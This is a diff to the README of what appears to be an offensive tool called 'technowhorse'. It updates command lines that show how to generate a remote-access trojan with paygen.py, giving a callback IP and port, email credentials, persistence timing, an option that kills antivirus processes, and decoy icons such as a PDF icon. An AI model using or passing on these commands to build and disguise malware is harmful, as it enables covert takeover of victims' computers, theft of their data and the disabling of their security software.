@@ -113,16 +113,16 @@ $ cd technowhorse
 $ bash installer_linux.sh
 
 $ chmod +x paygen.py
-$ ./paygen.py  --help    or   python paygen.py --help
+$ python3 paygen.py --help
 
 # Making Payload/RAT
-$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path
+$ python3 paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path
 
 # Making Payload/RAT with Custom AVKiller [By Default, Tons of Know AntiVirus is added in Kill_Targets]
-$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --kill_av AntiVirus.exe
+$ python3 paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --kill_av AntiVirus.exe
 
 # Making Payload/RAT with Custom Time to become persistence
-$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --persistence 10 
+$ python3 paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --persistence 10 
 
 Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
 ```
